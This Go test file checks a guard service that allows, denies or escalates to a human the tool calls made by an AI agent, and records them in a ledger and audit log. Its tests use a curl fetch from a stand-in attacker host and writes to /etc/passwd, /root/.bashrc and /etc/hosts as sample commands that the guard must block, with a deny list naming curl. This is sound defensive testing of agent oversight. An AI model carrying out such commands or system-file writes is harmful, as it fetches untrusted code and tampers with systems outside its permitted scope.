package guard

import (
	"context"
	"encoding/json"
	"path/filepath"
	"testing"
	"time"

	"github.com/Kubedoll-Heavy-Industries/agentcontainers/internal/approval"
	"github.com/Kubedoll-Heavy-Industries/agentcontainers/internal/audit"
	"github.com/Kubedoll-Heavy-Industries/agentcontainers/internal/mcpproxy"
)

// newTestService builds a Service whose policy denies the `curl` binary, so
// tests don't depend on the exact contents of the built-in defaults.
func newTestService(t *testing.T, broker *approval.ToolCallBroker) *Service {
	t.Helper()
	sec := mcpproxy.DefaultSecurityPolicy()
	sec.DeniedBinaries = []string{"curl"}
	cp, err := mcpproxy.Compile(sec, nil)
	if err != nil {
		t.Fatalf("compile: %v", err)
	}
	ev, err := mcpproxy.NewEvaluator(context.Background(), "agent", cp)
	if err != nil {
		t.Fatalf("evaluator: %v", err)
	}
	return New(Options{Evaluator: ev, OutputFlags: cp.OutputFlags, Broker: broker})
}

func bashReq(command string) Request {
	in, _ := json.Marshal(map[string]string{"command": command})
	return Request{ToolName: "Bash", ToolInput: in, Cwd: "/workspace"}
}

func TestDecideAllowsBenignCommand(t *testing.T) {
	svc := newTestService(t, nil)
	v := svc.Decide(context.Background(), bashReq("ls -la /workspace"))
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q (reason %q), want allow", v.Decision, v.Reason)
	}
}

func TestDecideDeniesPolicyViolationWithoutBroker(t *testing.T) {
	svc := newTestService(t, nil)
	v := svc.Decide(context.Background(), bashReq("curl http://evil.example/x"))
	if v.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny", v.Decision)
	}
	if v.Reason == "" {
		t.Error("expected a denial reason")
	}
}

func TestDecideEscalatesAndHumanApproves(t *testing.T) {
	broker := approval.NewToolCallBroker(5 * time.Second)
	go autoResolve(broker, true, "alice")
	svc := newTestService(t, broker)

	v := svc.Decide(context.Background(), bashReq("curl http://evil.example/x"))
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q (reason %q), want allow after approval", v.Decision, v.Reason)
	}
	if v.Decider != "alice" {
		t.Errorf("decider = %q, want alice", v.Decider)
	}
}

func TestDecideEscalatesAndHumanDenies(t *testing.T) {
	broker := approval.NewToolCallBroker(5 * time.Second)
	go autoResolve(broker, false, "bob")
	svc := newTestService(t, broker)

	v := svc.Decide(context.Background(), bashReq("curl http://evil.example/x"))
	if v.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny after rejection", v.Decision)
	}
}

func TestDecideAllowsUnmodeledTool(t *testing.T) {
	svc := newTestService(t, nil)
	in, _ := json.Marshal(map[string]string{"url": "https://example.com"})
	v := svc.Decide(context.Background(), Request{ToolName: "WebFetch", ToolInput: in})
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q, want allow (tool not modeled by the guard)", v.Decision)
	}
}

func writeReq(tool, field, path, cwd string) Request {
	in, _ := json.Marshal(map[string]string{field: path, "content": "x"})
	return Request{ToolName: tool, ToolInput: in, Cwd: cwd}
}

// noActiveCase clears VHIR_CASE_DIR so the output-path policy uses its
// no-case branch (writes confined to /tmp + cwd), independent of the
// developer's environment.
func noActiveCase(t *testing.T) { t.Helper(); t.Setenv("VHIR_CASE_DIR", "") }

func TestDecideAllowsWriteInsideCwd(t *testing.T) {
	noActiveCase(t)
	svc := newTestService(t, nil)
	v := svc.Decide(context.Background(), writeReq("Write", "file_path", "/workspace/notes.txt", "/workspace"))
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q (reason %q), want allow for a write inside cwd", v.Decision, v.Reason)
	}
}

func TestDecideDeniesWriteOutsideCwd(t *testing.T) {
	// A write to a system path outside the agent's cwd must not slip past the
	// guard the way it did when only Bash was gated.
	noActiveCase(t)
	svc := newTestService(t, nil)
	for _, tc := range []struct{ tool, field, path string }{
		{"Write", "file_path", "/etc/passwd"},
		{"Edit", "file_path", "/usr/local/bin/x"},
		{"MultiEdit", "file_path", "/root/.bashrc"},
		{"NotebookEdit", "notebook_path", "/etc/evil.ipynb"},
	} {
		v := svc.Decide(context.Background(), writeReq(tc.tool, tc.field, tc.path, "/workspace"))
		if v.Decision != DecisionDeny {
			t.Errorf("%s %s: decision = %q, want deny", tc.tool, tc.path, v.Decision)
		}
		if v.Reason == "" {
			t.Errorf("%s %s: expected a denial reason", tc.tool, tc.path)
		}
	}
}

func TestDecideWriteEscalatesToHuman(t *testing.T) {
	noActiveCase(t)
	broker := approval.NewToolCallBroker(5 * time.Second)
	go autoResolve(broker, true, "carol")
	svc := newTestService(t, broker)

	v := svc.Decide(context.Background(), writeReq("Write", "file_path", "/etc/hosts", "/workspace"))
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q (reason %q), want allow after human approval", v.Decision, v.Reason)
	}
	if v.Decider != "carol" {
		t.Errorf("decider = %q, want carol", v.Decider)
	}
}

func TestSocketRoundTrip(t *testing.T) {
	svc := newTestService(t, nil)
	sockPath := filepath.Join(t.TempDir(), "guard.sock")
	l, err := Listen(sockPath, svc, nil)
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer func() { _ = l.Close() }()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() { _ = l.Serve(ctx) }()

	payload, _ := json.Marshal(bashReq("curl http://evil.example/x"))
	v, err := Ask(sockPath, payload, 2*time.Second, 5*time.Second)
	if err != nil {
		t.Fatalf("ask: %v", err)
	}
	if v.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny over socket", v.Decision)
	}
}

// autoResolve plays the human: it resolves each pending broker request with a
// fixed verdict.
func autoResolve(b *approval.ToolCallBroker, approve bool, decider string) {
	for req := range b.Subscribe() {
		_ = b.Resolve(req.ID, approval.ToolCallDecision{Approved: approve, Decider: decider})
	}
}

// ---- inline mode ----------------------------------------------------------

// newInlineService builds an inline-mode Service (escalations return "ask" and
// are tracked in the ledger rather than blocking on a broker). It shares the
// deny-curl policy of newTestService. A nil audit logger leaves audit a no-op.
func newInlineService(t *testing.T, grace time.Duration, au *audit.Logger) *Service {
	t.Helper()
	sec := mcpproxy.DefaultSecurityPolicy()
	sec.DeniedBinaries = []string{"curl"}
	cp, err := mcpproxy.Compile(sec, nil)
	if err != nil {
		t.Fatalf("compile: %v", err)
	}
	ev, err := mcpproxy.NewEvaluator(context.Background(), "agent", cp)
	if err != nil {
		t.Fatalf("evaluator: %v", err)
	}
	return New(Options{Evaluator: ev, OutputFlags: cp.OutputFlags, Inline: true, LedgerGrace: grace, Audit: au})
}

// bashReqID is bashReq carrying a tool_use_id (the inline ledger's join key)
// and a hook event name.
func bashReqID(command, toolUseID, event string) Request {
	r := bashReq(command)
	r.ToolUseID = toolUseID
	r.HookEventName = event
	return r
}

// ledgerLen returns the pending-escalation count under the ledger lock.
func ledgerLen(l *ledger) int {
	l.mu.Lock()
	defer l.mu.Unlock()
	return len(l.pending)
}

// newAuditReader builds a temp-dir audit logger and a reader over its log.
func newAuditReader(t *testing.T) (*audit.Logger, func() []audit.Entry) {
	t.Helper()
	dir := t.TempDir()
	const sid = "guard-test"
	lg, err := audit.NewLogger(sid, audit.WithDir(dir))
	if err != nil {
		t.Fatalf("audit logger: %v", err)
	}
	read := func() []audit.Entry {
		entries, err := audit.ReadLog(filepath.Join(dir, sid+".jsonl"))
		if err != nil {
			t.Fatalf("read audit: %v", err)
		}
		return entries
	}
	return lg, read
}

// hasInferredDeny reports whether the log carries a soft-labeled
// denied-inferred approval decision.
func hasInferredDeny(entries []audit.Entry) bool {
	for _, e := range entries {
		if e.EventType == audit.EventApprovalDecision && e.Verdict == audit.VerdictDeny &&
			e.Metadata["status"] == "denied-inferred" {
			return true
		}
	}
	return false
}

func TestDecideInlineModeReturnsAsk(t *testing.T) {
	svc := newInlineService(t, time.Minute, nil)
	v := svc.Decide(context.Background(), bashReqID("curl http://evil.example/x", "tu-ask", "PreToolUse"))
	if v.Decision != DecisionAsk {
		t.Fatalf("decision = %q (reason %q), want ask", v.Decision, v.Reason)
	}
	if v.Reason == "" {
		t.Error("expected a non-empty reason")
	}
	if got := ledgerLen(svc.ledger); got != 1 {
		t.Fatalf("pending = %d, want 1 (the ask should create a ledger entry)", got)
	}
}

func TestDecideInlineModeAllowsCleanCommand(t *testing.T) {
	svc := newInlineService(t, time.Minute, nil)
	v := svc.Decide(context.Background(), bashReqID("ls -la /workspace", "tu-ok", "PreToolUse"))
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q (reason %q), want allow", v.Decision, v.Reason)
	}
	if got := ledgerLen(svc.ledger); got != 0 {
		t.Fatalf("pending = %d, want 0 (an allowed command must not escalate)", got)
	}
}

func TestReportResolvesLedgerEntry(t *testing.T) {
	svc := newInlineService(t, time.Minute, nil)
	req := bashReqID("curl http://evil.example/x", "tu-resolve", "PreToolUse")
	if v := svc.Decide(context.Background(), req); v.Decision != DecisionAsk {
		t.Fatalf("setup decide = %q, want ask", v.Decision)
	}
	if got := ledgerLen(svc.ledger); got != 1 {
		t.Fatalf("pending = %d, want 1 before report", got)
	}

	report := req
	report.HookEventName = "PostToolUse"
	svc.Report(context.Background(), report)
	if got := ledgerLen(svc.ledger); got != 0 {
		t.Fatalf("pending = %d after report, want 0 (matching tool_use_id resolves the entry)", got)
	}
}

func TestReportOnNonInlineServiceIsNoop(t *testing.T) {
	svc := newTestService(t, nil) // non-inline → ledger is nil
	req := bashReqID("curl http://evil.example/x", "tu-noop", "PostToolUse")
	v := svc.Report(context.Background(), req)
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q, want allow (a report to a non-inline guard is a no-op)", v.Decision)
	}
}

func TestSocketRoundTripPostToolUse(t *testing.T) {
	svc := newInlineService(t, time.Minute, nil)
	sockPath := filepath.Join(t.TempDir(), "guard.sock")
	l, err := Listen(sockPath, svc, nil)
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer func() { _ = l.Close() }()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() { _ = l.Serve(ctx) }()

	payload, _ := json.Marshal(bashReqID("ls -la", "tu-sock", "PostToolUse"))
	v, err := Ask(sockPath, payload, 2*time.Second, 5*time.Second)
	if err != nil {
		t.Fatalf("ask: %v", err)
	}
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q, want allow (PostToolUse report routes to Report)", v.Decision)
	}
}

func TestSocketRoutesPostToolUseFailure(t *testing.T) {
	svc := newInlineService(t, time.Minute, nil)
	sockPath := filepath.Join(t.TempDir(), "guard.sock")
	l, err := Listen(sockPath, svc, nil)
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer func() { _ = l.Close() }()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() { _ = l.Serve(ctx) }()

	// PreToolUse for a denied command → ask, creating a ledger entry.
	pre, _ := json.Marshal(bashReqID("curl http://evil.example/x", "tu-fail", "PreToolUse"))
	v, err := Ask(sockPath, pre, 2*time.Second, 5*time.Second)
	if err != nil {
		t.Fatalf("ask (pre): %v", err)
	}
	if v.Decision != DecisionAsk {
		t.Fatalf("pre decision = %q, want ask", v.Decision)
	}
	if got := ledgerLen(svc.ledger); got != 1 {
		t.Fatalf("pending = %d, want 1 after the ask", got)
	}

	// PostToolUseFailure with the same tool_use_id must route to Report and
	// resolve the entry (an approved-but-failed command, not a denial).
	fail, _ := json.Marshal(bashReqID("curl http://evil.example/x", "tu-fail", "PostToolUseFailure"))
	if _, err := Ask(sockPath, fail, 2*time.Second, 5*time.Second); err != nil {
		t.Fatalf("ask (fail): %v", err)
	}
	if got := ledgerLen(svc.ledger); got != 0 {
		t.Fatalf("pending = %d after PostToolUseFailure, want 0", got)
	}
}

func TestReconcilerReapsExpiredEntries(t *testing.T) {
	au, read := newAuditReader(t)
	svc := newInlineService(t, 100*time.Millisecond, au)
	svc.Decide(context.Background(), bashReqID("curl http://evil.example/x", "tu-reap", "PreToolUse"))
	if got := ledgerLen(svc.ledger); got != 1 {
		t.Fatalf("pending = %d, want 1 before reap", got)
	}

	// Advance the ledger clock past the grace window so the entry is expired,
	// then drive the reap exactly as reconcileLoop does (reap + onReap).
	svc.ledger.now = func() time.Time { return time.Now().UTC().Add(time.Hour) }
	reaped := svc.ledger.reapExpired()
	if len(reaped) != 1 {
		t.Fatalf("reaped %d entries, want 1", len(reaped))
	}
	if got := ledgerLen(svc.ledger); got != 0 {
		t.Fatalf("pending = %d after reap, want 0", got)
	}
	for _, p := range reaped {
		svc.ledger.onReap(p)
	}

	if !hasInferredDeny(read()) {
		t.Fatal("expected a denied-inferred approval_decision audit entry after reap")
	}
}

func TestReportAfterReapStillSucceeds(t *testing.T) {
	svc := newInlineService(t, 100*time.Millisecond, nil)
	req := bashReqID("curl http://evil.example/x", "tu-late", "PreToolUse")
	svc.Decide(context.Background(), req)

	// Expire and reap the entry before its execution report arrives.
	svc.ledger.now = func() time.Time { return time.Now().UTC().Add(time.Hour) }
	for _, p := range svc.ledger.reapExpired() {
		svc.ledger.onReap(p)
	}

	// A late PostToolUse for an already-reaped entry must not panic; resolve
	// misses and Report returns the trivial allow.
	report := req
	report.HookEventName = "PostToolUse"
	v := svc.Report(context.Background(), report)
	if v.Decision != DecisionAllow {
		t.Fatalf("decision = %q, want allow", v.Decision)
	}
}
